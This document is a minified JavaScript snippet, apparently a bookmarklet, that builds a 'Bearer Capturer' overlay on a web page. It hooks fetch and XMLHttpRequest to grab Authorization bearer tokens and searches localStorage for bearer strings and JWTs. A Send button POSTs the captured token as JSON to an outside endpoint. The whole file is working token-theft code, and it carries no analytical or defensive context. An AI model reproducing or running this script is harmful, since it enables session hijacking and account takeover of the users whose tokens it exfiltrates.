(()=>{const E='https://studio--morricards.us-central1.hosted.app/api/bearer';if(window.__tokCap)return alert('Token capturer active');window.__tokCap=1;const d=document,b=d.createElement('div');b.style.cssText='position:fixed;left:12px;right:12px;bottom:12px;z-index:2147483647;background:#0b0b0c;color:#fff;padding:12px;border-radius:12px;border:1px solid #222;box-shadow:0 8px 30px rgba(0,0,0,.5);font:14px system-ui,Arial';b.innerHTML='<div style="display:flex;gap:8px;align-items:center;margin-bottom:8px"><b>Bearer Capturer</b><span id="m" style="margin-left:auto;opacity:.8"></span><button id="x" style="margin-left:8px;background:#1c1c1f;border:1px solid #333;border-radius:8px;color:#fff;padding:6px 10px">Close</button></div><textarea id="t" style="width:100%;height:110px;border-radius:8px;padding:8px;border:1px solid #333;background:#111;color:#eee;resize:vertical"></textarea><div style="margin-top:10px;display:flex;gap:8px;flex-wrap:wrap"><button id="s" style="flex:1;min-width:120px;padding:10px;border-radius:8px;border:0;background:#2f7bff;color:#fff;font-weight:700">Send</button><button id="c" style="flex:1;min-width:120px;padding:10px;border-radius:8px;border:1px solid #333;background:#1c1c1f;color:#fff">Copy</button><button id="q" style="padding:10px 12px;border-radius:8px;border:1px solid #333;background:#1c1c1f;color:#fff">Quick Scan</button></div>';d.body.appendChild(b);const T=b.querySelector('#t'),M=b.querySelector('#m');function msg(s){M.textContent=s}function found(v){T.value=v;msg('Captured.');try{localStorage.setItem('__last_bearer',v)}catch(_){}}function cap(k,v){if((k||'').toLowerCase()==='authorization'){const m=/bearer\s+([^\s]+)/i.exec(v||'');m&&m[1]&&found(m[1])}}const F=window.fetch;window.fetch=async function(i,n){try{const r=new Request(i,n);for(const [k,v] of r.headers.entries())cap(k,v);return await F(r)}catch(e){if(n&&n.headers){const h=n.headers;Array.isArray(h)?h.forEach(([k,v])=>cap(k,v)):h&&typeof h.forEach=='function'?h.forEach((v,k)=>cap(k,v)):typeof h=='object'&&Object.entries(h).forEach(([k,v])=>cap(k,v))}return F(i,n)}};const X=XMLHttpRequest.prototype.setRequestHeader;XMLHttpRequest.prototype.setRequestHeader=function(k,v){try{cap(k,v)}catch(e){}return X.apply(this,arguments)};b.querySelector('#c').onclick=()=>{const v=T.value.trim();if(!v)return msg('No token.');navigator.clipboard.writeText(v).then(()=>msg('Copied.')).catch(()=>msg('Copy failed.'))};b.querySelector('#s').onclick=()=>{const v=T.value.trim();if(!v)return msg('No token.');msg('Sending…');fetch(E,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token:v})}).then(r=>msg(r.ok?'Sent.':'Failed: '+r.status)).catch(()=>msg('Error'))};b.querySelector('#q').onclick=()=>{let hit=null;try{for(let i=0;i<localStorage.length;i++){const k=localStorage.key(i),val=localStorage.getItem(k)||'';if(/bearer\s+[A-Za-z0-9\-\._~\+\/]+=*/i.test(val)||/\beyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\b/.test(val)){hit=val.replace(/^Bearer\s+/i,'');break}}}catch(_){ }if(hit){found(hit);msg('Found in storage.')}else msg('No token found in storage.')};b.querySelector('#x').onclick=()=>{b.remove();window.__tokCap=0};try{const last=localStorage.getItem('__last_bearer');if(last)T.value=last}catch(_){ }msg('Ready — trigger an API request.');})();